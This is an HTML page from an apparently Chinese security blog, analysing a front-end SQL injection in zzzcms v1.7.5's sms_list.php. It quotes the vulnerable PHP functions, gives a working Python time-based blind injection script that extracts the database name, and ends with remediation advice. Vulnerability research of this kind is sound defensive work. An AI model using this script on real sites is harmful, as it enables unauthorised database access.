@@ -1,0 +1,893 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="yemoli's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="前言查看cnvd时发现了该cms一个较新的漏洞，决定分析一下  代码分析漏洞的触发点在plugins/sms/sms_list.php，该处文件可以直接在前台访问，看一下关键代码 1234567891011121314151617&amp;lt;?phprequire &apos;../../inc/zzz_admin.php&apos;;$act=getform(&quot;act&quot;,&quot;get&quot;);$id=getform(&quot;id&quot;,">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zzzcmsV1.7.5前台sql注入">
+<meta property="og:url" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="前言查看cnvd时发现了该cms一个较新的漏洞，决定分析一下  代码分析漏洞的触发点在plugins/sms/sms_list.php，该处文件可以直接在前台访问，看一下关键代码 1234567891011121314151617&amp;lt;?phprequire &apos;../../inc/zzz_admin.php&apos;;$act=getform(&quot;act&quot;,&quot;get&quot;);$id=getform(&quot;id&quot;,">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/1.png">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/2.png">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/3.png">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/4.png">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/5.png">
+<meta property="og:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/6.png">
+<meta property="og:updated_time" content="2020-05-06T12:37:39.490Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="zzzcmsV1.7.5前台sql注入">
+<meta name="twitter:description" content="前言查看cnvd时发现了该cms一个较新的漏洞，决定分析一下  代码分析漏洞的触发点在plugins/sms/sms_list.php，该处文件可以直接在前台访问，看一下关键代码 1234567891011121314151617&amp;lt;?phprequire &apos;../../inc/zzz_admin.php&apos;;$act=getform(&quot;act&quot;,&quot;get&quot;);$id=getform(&quot;id&quot;,">
+<meta name="twitter:image" content="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/">
+
+
+
+
+
+  <title>zzzcmsV1.7.5前台sql注入 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            friends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2020/05/06/zzzcmsV1-7-5前台sql注入/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">zzzcmsV1.7.5前台sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-06T19:42:22+08:00">
+                2020-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  881
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  4
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>查看cnvd时发现了该cms一个较新的漏洞，决定分析一下</p>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/1.png" alt="1"></p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>漏洞的触发点在<code>plugins/sms/sms_list.php</code>，该处文件可以直接在前台访问，看一下关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'../../inc/zzz_admin.php'</span>;</span><br><span class="line">$act=getform(<span class="string">"act"</span>,<span class="string">"get"</span>);</span><br><span class="line">$id=getform(<span class="string">"id"</span>,<span class="string">"post"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> ($act) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'del'</span>:</span><br><span class="line">	db_delete(<span class="string">'sms'</span>,<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br><span class="line">	<span class="keyword">exit</span>;		</span><br><span class="line">	<span class="keyword">break</span>;	</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'delall'</span>:			</span><br><span class="line">	db_delete(<span class="string">'sms'</span>,<span class="keyword">array</span>(<span class="string">'smsonoff'</span>=&gt;<span class="number">0</span>));</span><br><span class="line">	phpgo (<span class="string">'sms_list.php'</span>);</span><br><span class="line">	<span class="keyword">break</span>;	</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该处的<code>$id</code>与<code>$act</code>对输入均没有进行过滤的操作，跟进下方的<code>db_delete</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_delete</span><span class="params">( $table, $where, $d = NULL )</span> </span>&#123;</span><br><span class="line">	$db = $_SERVER[ <span class="string">'db'</span> ];</span><br><span class="line">	$d = $d ? $d : $db;</span><br><span class="line">	<span class="keyword">if</span> ( !$d ) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">	<span class="keyword">if</span> ( ifnum( $where ) ) &#123;</span><br><span class="line">		$where = table_id( $table ) . <span class="string">'='</span> . $where;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ( is_array( $where ) ) &#123;</span><br><span class="line">		$arrkey = array_keys( $where );</span><br><span class="line">		<span class="keyword">if</span> ( $arrkey[ <span class="number">0</span> ] === <span class="number">0</span> ) &#123;</span><br><span class="line">			$where = <span class="keyword">array</span>( table_id( $table ) =&gt; $where );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> ( $where == <span class="string">'recy'</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( $table == <span class="string">'content'</span> )$where = <span class="keyword">array</span>( <span class="string">'c_onoff'</span> =&gt; <span class="number">2</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$whereadd = db_cond_to_sqladd( $where );</span><br><span class="line">	<span class="comment">//var_dump("DELETE FROM [dbpre]$table $whereadd");</span></span><br><span class="line">	<span class="keyword">return</span> db_exec( <span class="string">"DELETE FROM [dbpre]$table $whereadd"</span>, $d );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进<code>db_cond_to_sqladd</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_cond_to_sqladd</span><span class="params">( $where )</span> </span>&#123;</span><br><span class="line">	$s = <span class="string">''</span>;	</span><br><span class="line">	<span class="keyword">if</span> ( DB_TYPE == <span class="string">'access'</span> )$where = toutf( $where );</span><br><span class="line">	<span class="keyword">if</span> ( !<span class="keyword">empty</span>( $where ) ) &#123;</span><br><span class="line">		$s = <span class="string">' WHERE '</span>;</span><br><span class="line">		<span class="keyword">if</span> ( is_array( $where ) ) &#123;</span><br><span class="line">			<span class="keyword">foreach</span> ( $where <span class="keyword">as</span> $k =&gt; $v ) &#123;</span><br><span class="line">				<span class="keyword">if</span> ( !is_array( $v ) ) &#123;</span><br><span class="line">                    $op = substr( $k, <span class="number">-1</span> );</span><br><span class="line">                    <span class="keyword">if</span> ( $op == <span class="string">'&gt;'</span> || $op == <span class="string">'&lt;'</span>  || $op == <span class="string">'='</span> ) &#123;						</span><br><span class="line">						<span class="keyword">if</span>(substr( $k, <span class="number">-2</span> )== <span class="string">'&gt;='</span> || substr( $k, <span class="number">-2</span> )== <span class="string">'&lt;='</span> || substr( $k, <span class="number">-2</span> )== <span class="string">'&lt;&gt;'</span>) &#123;</span><br><span class="line">							$op=substr( $k, <span class="number">-2</span> );</span><br><span class="line">							$k = substr( $k, <span class="number">0</span>, <span class="number">-2</span> );							</span><br><span class="line">						&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">							$k = substr( $k, <span class="number">0</span>, <span class="number">-1</span> );	</span><br><span class="line">						&#125;</span><br><span class="line">						$s .= <span class="string">"`$k`$op$v AND"</span>;						</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $v = ( ifnum( $v ) ) ? $v : <span class="string">"'"</span> . ( $v ) . <span class="string">"'"</span>;</span><br><span class="line">                        $s .= <span class="string">"`$k`=$v AND "</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">				&#125; <span class="keyword">elseif</span> ( <span class="keyword">isset</span>( $v[ <span class="number">0</span> ] ) ) &#123;</span><br><span class="line">					<span class="comment">// OR 效率比 IN 高</span></span><br><span class="line">					$s .= <span class="string">'('</span>;</span><br><span class="line">					<span class="comment">//$v = array_reverse($v);</span></span><br><span class="line">					<span class="keyword">foreach</span> ( $v <span class="keyword">as</span> $v1 ) &#123;</span><br><span class="line">						$v1 = ( ifnum( $v1 ) ) ? $v1 : <span class="string">"'"</span> . ( $v1 ) . <span class="string">"'"</span>;</span><br><span class="line">						$s .= <span class="string">"`$k`=$v1 OR "</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					$s = substr( $s, <span class="number">0</span>, <span class="number">-4</span> );</span><br><span class="line">					$s .= <span class="string">') AND '</span>;</span><br><span class="line"></span><br><span class="line">					<span class="comment">/*</span></span><br><span class="line"><span class="comment">					$ids = implode(',', $v);</span></span><br><span class="line"><span class="comment">					$s .= "$k IN ($ids) AND ";</span></span><br><span class="line"><span class="comment">					*/</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">foreach</span> ( $v <span class="keyword">as</span> $k1 =&gt; $v1 ) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( $k1 == <span class="string">'LIKE'</span> ) &#123;</span><br><span class="line">							<span class="keyword">if</span>(ifstrin($k,<span class="string">','</span>))&#123;								</span><br><span class="line">								<span class="keyword">foreach</span> (splits($k) <span class="keyword">as</span> $v2)&#123;</span><br><span class="line">									$ss .= <span class="string">"`$v2` LIKE '%"</span>.$v1.<span class="string">"%' or"</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								$ss=rtrim($ss,<span class="string">'or'</span>);</span><br><span class="line">								$s .= <span class="string">"($ss) AND"</span>;</span><br><span class="line">							&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">								$s .= <span class="string">"`$k` LIKE '%"</span>.$v1.<span class="string">"%' AND"</span>;</span><br><span class="line">							&#125;							</span><br><span class="line">						&#125;<span class="keyword">else</span> <span class="keyword">if</span>( $k1 == <span class="string">'FIND'</span>)&#123;</span><br><span class="line">							$s .= <span class="string">"(FIND_IN_SET($v1,`$k`) or $k='') AND"</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>( $k1 == <span class="string">'!FIND'</span>)&#123;</span><br><span class="line">							$s .= <span class="string">"!FIND_IN_SET($v1,`$k`) AND"</span>;</span><br><span class="line">                        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($k1 == <span class="string">'BETWEEN'</span>)&#123;               				</span><br><span class="line">                            $s .= <span class="string">"`$k` BETWEEN $v1 AND"</span>;</span><br><span class="line">						&#125;<span class="keyword">else</span> <span class="keyword">if</span>(is_int( $v1 ) || is_float( $v1 ) || $k1==<span class="string">'='</span>)&#123;</span><br><span class="line">							$s .= <span class="string">"`$k`$k1  $v1  AND "</span>;</span><br><span class="line">						&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">							$s .= <span class="string">"`$k`$k1 '"</span> . ( $v1 ) . <span class="string">"' AND "</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			$s = substr( $s, <span class="number">0</span>, <span class="number">-4</span> );</span><br><span class="line">            <span class="comment">//var_dump($s);</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$s .= $where;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里我们需要进行一些构造，使得代码运行到如下分支</p>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/2.png" alt=""></p>
+<p>注意到该处语句没有任何的过滤，直接拼接返回给了<code>db_delete</code>函数</p>
+<p>在<code>db_delete</code>函数中紧接着运行了<code>sql</code>语句</p>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/3.png" alt="3"></p>
+<p>跟进<code>db_exec</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_exec</span><span class="params">( $sql, $d = NULL ,$log=true)</span> </span>&#123;</span><br><span class="line">	$db = $_SERVER[ <span class="string">'db'</span> ];</span><br><span class="line">	$d = $d ? $d : $db;</span><br><span class="line">	<span class="keyword">if</span> ( !$d ) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">	$sql = str_replace( <span class="string">'[dbpre]'</span>, DB_PRE, $sql );</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    var_dump($sql);</span><br><span class="line">	$n = $d-&gt;exec( $sql );	</span><br><span class="line">	db_errno_errstr( $n, $d,$sql);</span><br><span class="line">	str_log( $sql.<span class="string">"\t"</span> , <span class="string">'log'</span> );</span><br><span class="line">	<span class="keyword">return</span> $n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里函数将参数进行替换后直接将语句带入了数据库执行，在这里我们就存在着机会将语句进行合理的拼接进行SQL注入</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>首先尝试报错注入，输出一下<code>sql</code>语句</p>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/4.png" alt=""></p>
+<p>但是程序并没有抛出错误代出数据，可能是 程序对异常抛出做了屏蔽处理，接着试一下时间盲注</p>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/5.png" alt="5"></p>
+<p>程序确实因为<code>sleep</code>函数的作用出现了响应延迟，这也意味着可以使用时间盲注进行利用，这里写了个利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/zzzcms/plugins/sms/sms_list.php?act=del'</span></span><br><span class="line">sql_dict=<span class="string">'1234567890-_`~qwertyuiopasdfghjklzxcvbnm,.&lt;&gt;&#123;&#125;[]@!#$%^&amp;*()'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    print(<span class="string">'============================='</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> sql_dict:</span><br><span class="line">        payload = &#123;<span class="string">'id[=if((ascii(substr((select database()),&#123;&#125;,1))="&#123;&#125;"),sleep(5),1)#]'</span>.format(i,ord(j)):<span class="string">'aaaa'</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = s.post(url,data=payload,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + j</span><br><span class="line">            print(result)</span><br><span class="line">            s.get(url)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/06/zzzcmsV1-7-5前台sql注入/6.png" alt="6"></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>建议该处对于数据的输入进行全局的过滤，对于需要使用<code>sql</code>语句的地方，每个参数做好严格的检查，也可以采用预编译的方式来执行<code>sql</code>语句。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/06/thinkphp反序列化漏洞分析/" rel="next" title="thinkphp反序列化漏洞分析">
+                <i class="fa fa-chevron-left"></i> thinkphp反序列化漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">59</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cdusec.com/" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top/" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
